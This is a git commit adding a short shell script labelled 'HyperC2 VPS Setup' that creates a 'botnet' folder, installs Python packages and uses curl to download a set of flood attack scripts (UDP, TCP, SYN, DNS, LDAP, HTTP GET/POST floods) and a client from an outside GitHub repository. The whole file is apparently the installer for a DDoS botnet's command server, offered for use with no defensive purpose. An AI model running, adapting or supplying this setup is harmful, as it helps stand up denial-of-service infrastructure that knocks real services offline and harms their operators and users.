0af1e29b6ddb4afdd123929c1d8cdf6fffbda83c
Abrissy <132929073+Abrissyy@users.noreply.github.com>
2024-07-20 11:35:00 +0200

    Add files via upload

---
+++ setup.sh
@@ -0,0 +1,17 @@
+# HyperC2 VPS Setup 
+mkdir botnet 
+cd botnet 
+sudo apt install python3 
+sudo apt install pip3 
+pip3 install requests
+pip3 install aiohttp 
+pip3 install 
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/udp.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/tcp.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/syn.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/post.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/ldap.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/get.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/dns.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/curl_flood.py
+curl -OJL https://raw.githubusercontent.com/Abrissyy/1/main/client.py
